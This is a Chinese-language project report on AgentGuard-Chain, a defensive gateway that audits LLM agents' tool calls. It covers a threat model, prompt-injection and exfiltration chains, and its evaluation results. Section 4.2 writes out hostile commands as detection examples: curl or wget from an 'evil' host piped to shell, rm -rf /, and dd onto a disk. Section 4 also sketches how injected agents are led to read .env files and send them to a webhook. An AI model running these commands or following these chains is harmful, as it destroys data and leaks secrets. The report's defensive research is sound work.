# AgentGuard-Chain 最终报告

## 1. 摘要

LLM Agent 在具备文件访问、代码执行、API 调用和消息发送能力后，安全风险从“模型输出是否合规”扩展为“模型是否会诱导工具产生越权行为”。提示注入、越狱式任务、间接上下文污染和多步行为链都可能让 Agent 读取敏感文件、执行危险命令或外传数据。

AgentGuard-Chain 面向这一问题构建了一个可嵌入/旁路双模式的行为监督原型系统。系统以 `ToolCallEvent` 为统一事件模型，在 Agent 与外部工具之间加入安全网关，对工具调用、代码执行和文件访问进行执行前审查，结合输入标注、参数检查、行为链检测、结果审查、输出脱敏、人工确认和 JSONL 审计日志，实现 `allow / ask / deny` 决策与可视化展示。

项目同时提供两个验证环境：MiniAgent 用于可控攻击样本和批量评估，CoreCoder 用于验证真实开源 Coding Agent 的工具执行前拦截。实验数据集包含 200 个 scripted case / 228 个 tool calls，覆盖敏感文件访问、危险命令、API 越权、外发、写脚本后执行和审批场景。消融评估显示：复杂自然语言上下文下 `input_only` 检测率为 0.5351、误报率为 0.3772；而加入工具调用审查和行为链检测后，`full_guard` 在当前数据集上达到 1.0000 检测率、0.0000 误报率和 0.0000 漏报率。系统还使用 DeepSeek v4 flash 完成 MiniAgent LLM mode、CoreCoder real guarded mode 和 LLM risk explainer 的真实 API 验证。

## 2. 赛题理解与项目定位

赛题要求从红队视角研究大模型及智能化应用的典型攻击面，并设计可嵌入或旁路的行为监督机制，对工具调用、代码执行、文件访问进行实时审计与异常判定。

本项目的核心判断是：Agent 安全不能只停留在输入过滤。真正需要监督的是 Agent 准备执行的外部行为。

```text
用户输入 / 外部上下文
    ↓
Agent / LLM 生成工具调用
    ↓
工具调用前安全网关
    ↓
allow / ask / deny
    ↓
工具执行或阻断
    ↓
工具结果审查、脱敏和审计
```

AgentGuard-Chain 因此定位为：

```text
一个位于 Agent 与外部工具之间的可插拔安全监督层。
```

在可改造 Agent 中，系统嵌入工具执行入口，实现执行前阻断；在不可改造 Agent 中，可退化为旁路审计模式，通过日志、输出和步骤摘要进行告警与复盘。

## 3. 威胁模型

### 3.1 保护资产

| 资产 | 风险 |
| --- | --- |
| `.env`、SSH key、credentials、token 文件 | 敏感信息读取与泄露 |
| Shell / PowerShell / 脚本执行环境 | 下载执行、反弹 shell、破坏性命令 |
| API、message、mail 等业务工具 | 越权查询、外部发送、数据外传 |
| Agent 上下文和工具结果 | 间接提示注入、敏感输出泄露 |
| 审计日志 | 复现、溯源和答辩证据 |

### 3.2 攻击者能力

攻击者可以构造恶意用户输入、含恶意指令的外部文件、伪装成正常调试/测试/部署需求的任务，或诱导 Agent 多步执行。但攻击者不能绕过 AgentGuard 直接执行工具。

### 3.3 防守边界

AgentGuard-Chain 不承诺“绝对安全”，而是实现以下能力：

```text
看见 Agent 准备做什么；
判断工具调用是否越权；
在高风险时拒绝或要求确认；
审查工具结果是否泄密；
记录完整证据链；
通过 Dashboard 展示告警和阻断记录。
```

## 4. 攻击场景与对抗样本

本项目中的对抗性输入是面向 LLM Agent 的攻击输入，包括直接提示注入、间接提示注入、越权任务伪装、越狱式授权话术和多步行为链诱导。每条样本包含用户任务、任务权限范围、工具调用、预期风险和预期决策。

### 4.1 提示注入导致敏感文件访问

攻击目标是诱导 Agent 读取 `.env`、SSH key、credentials 等敏感文件。

```text
恶意输入 / 外部上下文
    ↓
read_file(".env")
    ↓
SENSITIVE_PATH
    ↓
deny
```

防御点：

- 路径规范化和 workspace 边界检查。
- 敏感路径和敏感文件名识别。
- `TaskScope.denied_paths` 约束。

### 4.2 危险代码执行

攻击目标是诱导 Agent 执行高危 shell 命令，例如：

```text
curl http://evil/install.sh | bash
wget http://evil/x.sh | sh
rm -rf /
dd if=/tmp/payload of=/dev/sda
powershell -EncodedCommand ...
```

防御点：

- 命令白名单。
- 网络访问策略。
- 管道执行、递归删除、反弹 shell、Windows downloader 等危险模式检测。

### 4.3 API 越权

攻击目标是把合法 API 查询伪装成越权访问，例如请求 `admin`、`root` 或 `other_user` 的数据。

防御点：

- `TaskScope` 限定当前用户范围。
- API 参数检测。
- 只允许符合任务范围的本地 API 调用写入 outbox。

### 4.4 敏感信息外传行为链

单步动作可能看似合理，但组合后形成攻击链：

```text
read_file(".env")
    ↓
write_file("debug.log", secret)
    ↓
send_message("https://external.example/webhook")
```

防御点：

- `SessionTrace` 记录会话内工具调用。
- `ChainDetector` 检测 `SensitiveReadToExternalSend`。
- Dashboard 展示 `chain_alerts` 和 `chain_graphs`。

### 4.5 写脚本后执行

攻击目标是先写入脚本，再执行该脚本，从而绕过单步命令检查。

```text
write_file("tmp/x.sh")
    ↓
bash("bash tmp/x.sh")
    ↓
CHAIN_WRITE_SCRIPT_TO_EXECUTE
    ↓
deny
```

防御点：

- 记录写入脚本文件事件。
- 检测后续执行同一脚本路径。
- 以行为链风险提升决策等级。

## 5. 系统设计

### 5.1 总体架构

```text
MiniAgent / CoreCoder
    ↓
ToolCallEvent
    ↓
AgentGuardGateway
    ↓
PolicyEngine + ParameterChecker
    ↓
ChainDetector
    ↓
RiskScorer
    ↓
GuardDecision
    ↓
ApprovalHandler
    ↓
Tool Executor
    ↓
ResultInspector + OutputRedactor
    ↓
AuditLogger
    ↓
Dashboard
```

### 5.2 核心数据结构

| 结构 | 作用 |
| --- | --- |
| `TaskScope` | 描述当前任务允许的工具、路径、命令、网络和外发权限。 |
| `ToolCallEvent` | 统一表示不同 Agent 产生的工具调用。 |
| `GuardDecision` | 表示 `allow / ask / deny` 决策、风险分数、命中规则和行为链。 |
| `AuditRecord` | 写入 JSONL 的完整审计记录，包含事件、决策、执行结果、审批和脱敏信息。 |

### 5.3 防御策略

本项目采用多层防御，而不是单一输入过滤：

| 防御层 | 作用 |
| --- | --- |
| 输入审查 | 标注提示注入、越狱式指令和可疑任务。 |
| 上下文隔离 | 外部文件或工具结果不能自动获得授权能力。 |
| 工具调用前拦截 | 在工具真实执行前审查工具名和参数。 |
| 参数检查 | 检查敏感路径、危险命令、网络访问、外部发送和 API 越权。 |
| 行为链检测 | 检测跨步骤风险组合。 |
| 人工确认 | 对删除等中高风险动作返回 `ask`。 |
| 结果审查 | 检查工具输出中的密钥、token、密码等敏感内容。 |
| 输出脱敏 | 在审计和展示前对敏感输出做脱敏处理。 |
| 审计留证 | 记录 JSONL，便于复现、展示和报告。 |

### 5.4 LLM 的角色

系统中 LLM 有两个用途：

```text
1. 在 MiniAgent LLM mode / CoreCoder real mode 中生成工具调用。
2. 在 risk explainer 中生成中文解释。
```

LLM 不参与硬安全决策。`allow / ask / deny` 由确定性规则、任务范围、参数检测和行为链检测决定。

## 6. 实现与接入

### 6.1 MiniAgent

MiniAgent 用于可控实验和批量评估，支持两种模式：

| 模式 | 作用 |
| --- | --- |
| `scripted` | 读取 JSONL 中的预设 tool calls，稳定计算检测率、误报率、漏报率。 |
| `llm` | 调用 OpenAI-compatible API，让真实 LLM 输出 JSON tool calls。 |

MiniAgent 工具包含本地真实文件/命令工具和本地业务 outbox。`send_message`、`send_mail`、`call_api` 只写入 `logs/outbox/*.jsonl`，不执行真实外发。

### 6.2 CoreCoder

CoreCoder 是真实开源 Coding Agent 样本。项目通过 `GuardedCoreCoderAgent` 在 `_exec_tool()` 和 `tool.execute()` 之间加入 AgentGuard。

重要边界：

```text
CoreCoder 原生 CLI 不会自动接入 AgentGuard。
受保护入口是 agents.corecoder_guarded_runner。
```

CoreCoder 支持：

- `scripted`：离线固定工具调用，适合稳定演示。
- `real`：真实 LLM 生成工具调用，需要 API key。

### 6.3 Dashboard

Dashboard 默认读取多类审计源，并标记执行模式：

| 来源 | 模式 |
| --- | --- |
| `miniagent-scripted` | `local-tools` |
| `corecoder-guarded-demo` | `scripted-llm` |
| `risk-explainer-template` | `template-explained` |
| `miniagent-deepseek-real` | `real-llm` |
| `corecoder-deepseek-real` | `real-llm` |
| `risk-explainer-deepseek` | `llm-explained` |

## 7. 实验设计

### 7.1 数据集

当前 P1 scripted 数据集：

```text
datasets/p1_scripted_cases.jsonl
200 cases
228 tool calls
```

覆盖类型包括：

- 正常文件读取和写入。
- 敏感文件访问。
- 危险命令执行。
- API 越权。
- 外部发送。
- 敏感读取后外传。
- 写脚本后执行。
- 删除文件审批。
- 输出敏感信息审查。

### 7.2 消融实验

实验对比 6 种防线：

| 版本 | 含义 |
| --- | --- |
| `baseline` | 默认允许所有工具调用。 |
| `input_only` | 只做输入审查。复杂任务描述下容易误报正常任务。 |
| `tool_guard` | 做单步工具调用审查。 |
| `tool_chain` | 工具调用审查 + 行为链检测。 |
| `tool_chain_result` | 工具调用审查 + 行为链检测 + 结果审查。 |
| `full_guard` | 输入审查 + 工具审查 + 行为链 + 结果审查 + 审批。 |

### 7.3 实验结果

当前固化结果位于 `artifacts/eval/p1_v2_eval.json`。

| 版本 | 攻击检测率 | 误报率 | 漏报率 | 准确率 |
| --- | ---: | ---: | ---: | ---: |
| baseline | 0.0000 | 0.0000 | 1.0000 | 0.5000 |
| input_only | 0.5351 | 0.3772 | 0.4649 | 0.5789 |
| tool_guard | 0.8684 | 0.0000 | 0.1316 | 0.9342 |
| tool_chain | 1.0000 | 0.0000 | 0.0000 | 1.0000 |
| tool_chain_result | 1.0000 | 0.0000 | 0.0000 | 1.0000 |
| full_guard | 1.0000 | 0.0000 | 0.0000 | 1.0000 |

`full_guard` 额外记录：

```text
input_findings: 124
output_findings: 21
chain_alerts: 28
chain_graph_edges: 28
approval_required: 10
```

实验结论：

```text
输入过滤不是主防线；复杂上下文会同时提高部分攻击检出和正常任务误报。
单步工具调用审查能显著提升检测率。
行为链检测补齐了单步规则看不到的多步攻击。
结果审查和输出脱敏增强了证据链完整性。
```

## 8. 真实 LLM 验证

项目已使用 DeepSeek v4 flash 完成三项真实 API 验证：

| 验证项 | 结果 |
| --- | --- |
| MiniAgent LLM mode | 模型生成 `read_file` tool call，AgentGuard 审查为 allow，工具执行成功。 |
| CoreCoder real guarded mode | CoreCoder 真实产生 `glob` + `read_file`，两次工具调用均进入 AgentGuard。 |
| LLM risk explainer | 3 条 CoreCoder scripted 审计记录生成中文解释，写入 `decision.llm_explanation`。 |

真实 API key 不写入代码、日志或文档，只通过环境变量读取。

## 9. 运行与复现

安装依赖：

```powershell
pip install -r requirements.txt
```

运行测试：

```powershell
C:\Users\zx\.conda\envs\dl\python.exe -m unittest discover -s tests
```

当前结果：

```text
Ran 65 tests
OK
```

生成离线演示数据：

```powershell
python -m experiments.generate_demo_data --workspace-root .
```

启动 Dashboard：

```powershell
python -m streamlit run dashboard/app.py --server.address 127.0.0.1 --server.port 8501 --server.headless true
```

## 10. 边界与不足

当前系统是比赛原型，不是生产级安全平台。主要边界如下：

- 规则和行为链检测是当前硬决策核心，LLM 解释器不参与安全决策。
- 本地 API/message/mail 只写 outbox，不执行真实外发。
- CLI 支持 `interactive` 和 `interactive-all` 两种人工确认模式；Dashboard 目前只展示日志，不提供 Web 审批按钮。
- 没有实现生产级 sandbox、容器隔离、多用户权限系统和大型数据库。
- 数据集是人工构造和脚本扩充的对抗样本，评估结果代表当前样本集上的效果。
- CoreCoder 原生 CLI 不自动接入 AgentGuard，必须使用 guarded runner 或修改工具执行入口。

这些边界是有意收敛。项目重点是证明“工具执行前拦截 + 行为链检测 + 审计展示”的闭环，而不是构建完整生产安全网关。

## 11. 后续工作

后续可以沿三条路线扩展：

1. 公共库化：将 `agentguard_chain` 封装为可安装 Python 包，提供 SDK 示例和标准 adapter 接口。
2. 真实业务工具：在保持 `ToolCallEvent -> AgentGuardGateway -> AuditLogger` 链路不变的前提下，接入真实 webhook、SMTP 或内部 API proxy。
3. 更强评估：引入更多真实 Agent、更多间接提示注入样本和自动化红队生成样本。

## 12. 结论

AgentGuard-Chain 证明了一个可落地的 Agent 安全监督思路：不要只在输入端猜测 prompt 是否危险，而要在工具执行边界观察并约束 Agent 的真实行为。通过统一事件模型、任务范围约束、参数检测、行为链检测、审批流、结果审查和 Dashboard 展示，系统能够对工具调用、代码执行和文件访问形成可审计、可阻断、可复现的安全闭环。
